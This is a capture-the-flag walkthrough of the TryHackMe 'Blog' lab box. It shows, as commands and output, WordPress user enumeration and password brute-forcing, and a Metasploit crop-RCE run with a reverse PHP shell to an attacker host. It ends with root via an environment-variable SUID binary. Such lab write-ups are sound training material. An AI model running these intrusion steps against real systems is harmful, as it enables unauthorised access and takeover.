# Blog

Billy Joel made a Wordpress blog! 

Room: https://tryhackme.com/room/blog

Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

In order to get the blog to work with , you'll need to add 10.64.129.2 blog. to your /etc/hosts file.

Credit to Sq00ky for the root privesc idea ;)

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/blog.md

---

## Enumeration

I started with a full TCP port scan.

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt 10.64.129.2
```

Open ports:

```text
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu
80/tcp  open  http        Apache httpd 2.4.29
139/tcp open  netbios-ssn Samba
445/tcp open  netbios-ssn Samba 4.7.6-Ubuntu
```

Nmap also showed the HTTP site was running WordPress:

```text
http-title: Billy Joel's IT Blog – The IT blog
http-generator: WordPress 5.0
```

The site used the hostname `blog.thm`, so I added it to `/etc/hosts`.

```bash
echo "10.64.129.2 blog.thm" | sudo tee -a /etc/hosts
```

---

## SMB Enumeration

Since SMB was open, I checked for anonymous access.

```bash
smbclient -L //10.64.129.2/ -N
```

I found a readable share and connected to it.

```bash
smbclient //10.64.129.2/<share> -N
```

Inside the share, I downloaded the files.

```text
smb: \> mget *
```

Files downloaded:

```text
Alice-White-Rabbit.jpg
tswift.mp4
check-this.png
```

The `Alice-White-Rabbit.jpg` file looked suspicious, so I checked it with `steghide`.

```bash
steghide extract -sf Alice-White-Rabbit.jpg
```

Using an empty passphrase extracted:

```text
rabbit_hole.txt
```

Contents:

```text
You've found yourself in a rabbit hole, friend.
```

This appeared to be a rabbit hole rather than the main path.

---

## WordPress Enumeration

I then enumerated WordPress with WPScan.

```bash
wpscan --url http://blog.thm/ -e u,vp,vt,cb,tt
```

WPScan confirmed the CMS version:

```text
WordPress version 5.0
```

It also found valid users:

```text
kwheel
bjoel
Karen Wheeler
Billy Joel
```

The interesting vulnerability was an authenticated WordPress crop/image RCE affecting this version range:

```text
WordPress 3.7-5.0 - Authenticated Code Execution
CVE-2019-8942 / CVE-2019-8943
```

Because the exploit required authentication, I tried a password attack against the discovered users.

```bash
cat > users.txt <<'EOF'
kwheel
bjoel
EOF
```

```bash
wpscan --url http://blog.thm/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```

WPScan found valid credentials:

```text
kwheel : c********
```

---

## Foothold

With valid WordPress credentials, I used Metasploit’s WordPress crop RCE module.

```bash
msfconsole
```

```text
use exploit/multi/http/wp_crop_rce
set RHOSTS blog.thm
set VHOST blog.thm
set RPORT 80
set SSL false
set TARGETURI /
set USERNAME kwheel
set PASSWORD c********
set payload php/reverse_php
set LHOST <attackbox-ip>
set LPORT 4445
run
```

The module authenticated successfully, uploaded the payload, and opened a shell.

```text
Command shell session opened
```

Checking the user showed I had code execution as the web user.

```bash
whoami
```

```text
www-data
```

I also upgraded the shell to Meterpreter using Metasploit.

```text
background
sessions -u <session-id>
sessions -i <meterpreter-session-id>
```

---

## Local Enumeration

From the shell, I checked the home directory.

```bash
ls -la /home/bjoel
```

Interesting files:

```text
Billy_Joel_Termination_May20-2020.pdf
user.txt
```

The `user.txt` in Billy’s home directory was a decoy.

```bash
cat /home/bjoel/user.txt
```

```text
You won't find what you're looking for here.

TRY HARDER
```

I downloaded and inspected the PDF.

```text
meterpreter > download /home/bjoel/Billy_Joel_Termination_May20-2020.pdf
```

Locally:

```bash
pdftotext Billy_Joel_Termination_May20-2020.pdf -
```

The PDF was a termination letter. The interesting clue was that Billy had repeated offences regarding the company removable media policy.

```text
Repeated offenses regarding company removable media policy
```

This hinted that the real user flag may be on removable media rather than in Billy’s home directory.

---

## Privilege Escalation

I ran a SUID binary search.

```bash
find / -perm -4000 -type f -printf '%u %g %m %p\n' 2>/dev/null
```

One unusual binary stood out:

```text
root root 6755 /usr/sbin/checker
```

I inspected it.

```bash
ls -la /usr/sbin/checker
file /usr/sbin/checker
strings /usr/sbin/checker
```

The binary was SUID/SGID root.

```text
-rwsr-sr-x 1 root root 8432 May 26 2020 /usr/sbin/checker
```

The `strings` output showed:

```text
getenv
admin
/bin/bash
Not an Admin
```

Running it normally returned:

```bash
/usr/sbin/checker
```

```text
Not an Admin
```

The binary appeared to check for an environment variable called `admin`. I set that variable and ran it again.

```bash
export admin=1
/usr/sbin/checker
```

This spawned a root shell.

```bash
whoami
id
```

```text
root
uid=0(root)
```

I then read the root flag.

```bash
cat /root/root.txt
```

Root flag:

```text
9a0b2b618bef9bfa7ac28c1353d9f***
```

---

## User Flag

After gaining root, I searched for all `user.txt` files.

```bash
find / -name "user.txt" -type f 2>/dev/null -exec ls -la {} \;
```

This revealed two files:

```text
/home/bjoel/user.txt
/media/usb/user.txt
```

The home directory file was the decoy. The real flag was in removable media, matching the PDF clue.

```bash
cat /media/usb/user.txt
```

User flag:

```text
c8421899aae571f7af486492b71a8***
```

---

## Summary

The attack path was:

```text
Nmap enumeration
→ SMB anonymous share
→ Rabbit hole stego file
→ WordPress 5.0 enumeration
→ WPScan user discovery
→ Password attack against WordPress users
→ Authenticated WordPress crop RCE
→ Shell as www-data
→ SUID enumeration
→ /usr/sbin/checker environment variable abuse
→ Root shell
→ Real user flag found on /media/usb
```

The main lessons from this room were:

* SMB may contain decoys or hints rather than direct credentials.
* WPScan is useful for identifying users and version-specific vulnerabilities.
* Authenticated WordPress RCE still requires valid credentials.
* Fake flags and decoy files can waste time.
* PDF/story content can contain real enumeration hints.
* Custom SUID binaries should always be inspected with `file` and `strings`.
* Environment-variable checks in SUID binaries can lead to easy privilege escalation.
